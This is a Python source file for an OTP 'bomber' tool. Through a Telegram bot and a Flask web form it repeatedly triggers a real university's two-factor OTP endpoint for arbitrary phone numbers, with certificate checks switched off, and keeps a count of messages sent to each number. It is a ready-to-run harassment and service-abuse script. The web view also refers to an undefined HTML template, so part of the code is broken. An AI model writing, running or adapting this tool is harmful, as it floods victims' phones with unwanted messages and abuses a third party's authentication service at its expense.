import os
import time
import requests
import telebot
from flask import Flask, render_template_string, request
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

OTP_GEN_URL = "https://twofa.srmu.ac.in/otp/generate"

otp_tracker = {}

API_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
bot = telebot.TeleBot(API_TOKEN)

# ===================== CORE FUNCTION =====================

def send_otps(numbers, otp_count):
    session = requests.Session()
    session.verify = False

    batch_results = []

    for phone in numbers:
        sent = 0
        otp_tracker.setdefault(phone, 0)

        for _ in range(otp_count):
            try:
                resp = session.post(f"{OTP_GEN_URL}/{phone}/123", timeout=10)

                sent += 1
                otp_tracker[phone] += 1

                time.sleep(1)

            except Exception as e:
                batch_results.append({
                    "phone": phone,
                    "status": f"Error: {str(e)}",
                    "sent_now": sent,
                    "total_sent": otp_tracker[phone]
                })
                break

        else:
            batch_results.append({
                "phone": phone,
                "status": "OTP sent",
                "sent_now": sent,
                "total_sent": otp_tracker[phone]
            })

    return batch_results


# ===================== TELEGRAM BOT =====================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(
        message,
        "Welcome!\nUse:\n/send <phone1,phone2> <count>\nExample:\n/send 9876543210,1234567890 5"
    )


@bot.message_handler(commands=['send'])
def handle_send_otp(message):
    try:
        args = message.text.split()

        if len(args) < 3:
            bot.reply_to(message, "Usage: /send <phone1,phone2> <count>")
            return

        phones_raw = args[1]
        otp_count_raw = args[2]

        try:
            otp_count = int(otp_count_raw)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            bot.reply_to(message, "OTP count must be positive number.")
            return

        numbers = [
            n.strip() for n in phones_raw.split(",")
            if n.strip().isdigit()
        ]

        if not numbers:
            bot.reply_to(message, "Invalid phone numbers.")
            return

        bot.reply_to(message, f"🚀 Sending OTP to {len(numbers)} numbers...")

        results = send_otps(numbers, otp_count)

        response = ["✅ OTP Result:"]
        for r in results:
            response.append(
                f"📱 {r['phone']} → {r['status']} | Sent: {r['sent_now']} | Total: {r['total_sent']}"
            )

        bot.reply_to(message, "\n".join(response))

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


@bot.message_handler(commands=['status'])
def handle_status(message):
    if not otp_tracker:
        bot.reply_to(message, "No activity yet.")
        return

    msg = "📊 OTP Tracker:\n"
    for phone, total in otp_tracker.items():
        msg += f"📱 {phone}: {total}\n"

    bot.reply_to(message, msg)


# ===================== FLASK PART =====================

@app.route("/", methods=["GET", "POST"])
def index():
    results = []
    error = None

    if request.method == "POST":
        numbers_raw = request.form.get("numbers", "").strip()
        otp_count = request.form.get("otp_count", "1").strip()

        if not numbers_raw:
            error = "Enter at least one number."
            return render_template_string(HTML_TEMPLATE, error=error)

        try:
            otp_count = int(otp_count)
            if otp_count <= 0:
                raise ValueError
        except ValueError:
            error = "OTP count must be positive."
            return render_template_string(HTML_TEMPLATE, error=error)

        numbers = [
            n.strip() for n in numbers_raw.replace("\n", ",").split(",")
            if n.strip().isdigit()
        ]

        results = send_otps(numbers, otp_count)

    return render_template_string(
        HTML_TEMPLATE,
        results=results,
        tracker=otp_tracker,
        error=error
    )


# ===================== RUN MODE =====================

if __name__ == "__main__":

    MODE = os.environ.get("MODE", "WEB")  
    # WEB / BOT / BOTH

    if MODE == "BOT":
        print("Starting Telegram Bot...")
        bot.infinity_polling()

    elif MODE == "WEB":
        print("Starting Flask Web...")
        app.run(debug=True, port=5000)

    else:
        # Run both using thread
        from threading import Thread

        Thread(target=lambda: app.run(port=5000)).start()
        print("Starting Telegram Bot...")
        bot.infinity_polling()
